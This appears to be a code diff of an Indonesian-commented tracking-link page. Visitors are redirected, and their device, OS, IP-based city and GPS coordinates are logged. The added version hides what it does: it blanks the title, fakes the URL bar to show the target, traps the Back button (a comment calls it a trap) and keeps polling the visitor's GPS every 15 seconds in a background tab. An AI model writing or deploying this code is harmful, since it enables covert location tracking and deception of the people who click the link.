@@ -1,96 +1,135 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
-    <style>
-        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title></title> <!-- kosong -->
+  <style>
+    body, html {
+      margin:0; padding:0;
+      width:100%; height:100%;
+      background:#fff;
+    }
+  </style>
 </head>
 <body>
-    <script>
-        const urlParams = new URLSearchParams(window.location.search);
-        const linkId = urlParams.get('id');
-        const links = JSON.parse(localStorage.getItem('trackingLinks')) || {};
-        const linkData = links[linkId];
-    
-        if (linkData) {
-            const clickData = { timestamp: Date.now() };
+  <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const linkId = urlParams.get('id');
+    const links = JSON.parse(localStorage.getItem('trackingLinks')) || {};
+    const linkData = links[linkId];
 
-            // Deteksi Device & OS dari User-Agent
-            const ua = navigator.userAgent.toLowerCase();
-            let device = "Unknown Device";
-            let os = "Unknown OS";
-            
-            if (ua.includes("oppo")) device = "Oppo";
-            else if (ua.includes("vivo")) device = "Vivo";
-            else if (ua.includes("xiaomi")) device = "Xiaomi";
-            else if (ua.includes("redmi")) device = "Xiaomi (Redmi)";
-            else if (ua.includes("samsung")) device = "Samsung";
-            else if (ua.includes("realme")) device = "Realme";
-            else if (ua.includes("huawei")) device = "Huawei";
-            else if (ua.includes("infinix")) device = "Infinix";
-            else if (ua.includes("asus")) device = "Asus";
-            else if (ua.includes("iphone")) device = "iPhone";
-            else if (ua.includes("ipad")) device = "iPad";
-    
-            if (ua.includes("android")) os = "Android";
-            else if (ua.includes("iphone") || ua.includes("ipad") || ua.includes("ipod")) os = "iOS";
-            else if (ua.includes("win")) os = "Windows";
-            else if (ua.includes("mac")) os = "MacOS";
-            else if (ua.includes("linux")) os = "Linux";
-    
-            clickData.device = device;
-            clickData.os = os;
-    
-            //Ambil IPv4 dari ipify
-            fetch('https://api.ipify.org?format=json')
-                .then(res => res.json())
-                .then(ipData => {
-                    const ipv4 = ipData.ip;
-    
-                    //Dapatkan info lokasi (city, country) dari ipapi
-                    return fetch(`https://ipapi.co/${ipv4}/json/`)
-                        .then(res => res.json())
-                        .then(geo => {
-                            clickData.ipInfo = {
-                                ip: ipv4,
-                                city: geo.city,
-                                country: geo.country_name
-                            };
-    
-                            //Lokasi GPS kalau diizinkan
-                            if (navigator.geolocation) {
-                                navigator.geolocation.getCurrentPosition(
-                                    pos => {
-                                        clickData.location = {
-                                            latitude: pos.coords.latitude,
-                                            longitude: pos.coords.longitude
-                                        };
-                                        saveAndRedirect();
-                                    },
-                                    () => saveAndRedirect(),
-                                    { timeout: 5000 }
-                                );
-                            } else {
-                                saveAndRedirect();
-                            }
-                        });
-                })
-                .catch(() => saveAndRedirect());
-    
-            function saveAndRedirect() {
-                if (!linkData.clicks) linkData.clicks = [];
-                linkData.clicks.push(clickData);
-                links[linkId] = linkData;
-                localStorage.setItem('trackingLinks', JSON.stringify(links));
-                window.location.href = linkData.targetUrl;
-            }
-    
+    if (!linkData) {
+      document.body.innerHTML = '<h1>Error: Tautan tidak valid</h1>';
+    } else {
+      // ganti URL tab biar kelihatan target
+      history.replaceState(null, "", linkData.targetUrl);
+      // tambahin pushState supaya tombol "Back" jebakannya tetap ke target
+      history.pushState(null, "", linkData.targetUrl);
+
+      // buka target di tab baru
+      const win = window.open(linkData.targetUrl, "_blank");
+      if (win) {
+        win.focus();
+        window.blur();
+      }
+
+      // kalau user tekan tombol back, tetap stay di targetUrl
+      window.onpopstate = function() {
+        history.pushState(null, "", linkData.targetUrl);
+      };
+
+      // data klik awal
+      const clickData = {
+        timestamp: Date.now(),
+        device: detectDevice(),
+        os: detectOS(),
+        ipInfo: null,
+        location: null
+      };
+
+      // ambil IP info
+      fetch('https://api.ipify.org?format=json')
+        .then(res => res.json())
+        .then(ipData => {
+          const ipv4 = ipData.ip;
+          return fetch(`https://ipapi.co/${ipv4}/json/`)
+            .then(res => res.json())
+            .then(geo => {
+              clickData.ipInfo = {
+                ip: ipv4,
+                city: geo.city,
+                country: geo.country_name
+              };
+            });
+        })
+        .catch(() => {});
+
+      // fungsi ambil lokasi GPS berkala
+      function getLocation() {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            pos => {
+              clickData.location = {
+                latitude: pos.coords.latitude,
+                longitude: pos.coords.longitude
+              };
+              saveClick();
+            },
+            () => saveClick(),
+            { timeout: 5000 }
+          );
         } else {
-            document.body.innerHTML = '<h1>Error: Tautan tidak valid</h1>';
+          saveClick();
         }
-    </script>
+      }
+
+      // simpan data klik
+      function saveClick() {
+        if (!linkData.clicks) linkData.clicks = [];
+        linkData.clicks.push({
+          timestamp: Date.now(),
+          device: clickData.device,
+          os: clickData.os,
+          ipInfo: clickData.ipInfo,
+          location: clickData.location
+        });
+        links[linkId] = linkData;
+        localStorage.setItem('trackingLinks', JSON.stringify(links));
+      }
+
+      // deteksi device
+      function detectDevice() {
+        const ua = navigator.userAgent.toLowerCase();
+        if (ua.includes("oppo")) return "Oppo";
+        if (ua.includes("vivo")) return "Vivo";
+        if (ua.includes("xiaomi")) return "Xiaomi";
+        if (ua.includes("redmi")) return "Xiaomi (Redmi)";
+        if (ua.includes("samsung")) return "Samsung";
+        if (ua.includes("realme")) return "Realme";
+        if (ua.includes("huawei")) return "Huawei";
+        if (ua.includes("infinix")) return "Infinix";
+        if (ua.includes("asus")) return "Asus";
+        if (ua.includes("iphone")) return "iPhone";
+        if (ua.includes("ipad")) return "iPad";
+        return "Unknown Device";
+      }
+
+      // deteksi OS
+      function detectOS() {
+        const ua = navigator.userAgent.toLowerCase();
+        if (ua.includes("android")) return "Android";
+        if (ua.includes("iphone") || ua.includes("ipad") || ua.includes("ipod")) return "iOS";
+        if (ua.includes("win")) return "Windows";
+        if (ua.includes("mac")) return "MacOS";
+        if (ua.includes("linux")) return "Linux";
+        return "Unknown OS";
+      }
+
+      // jalankan ambil lokasi tiap 15 detik
+      getLocation();
+      setInterval(getLocation, 15000);
+    }
+  </script>
 </body>
 </html>
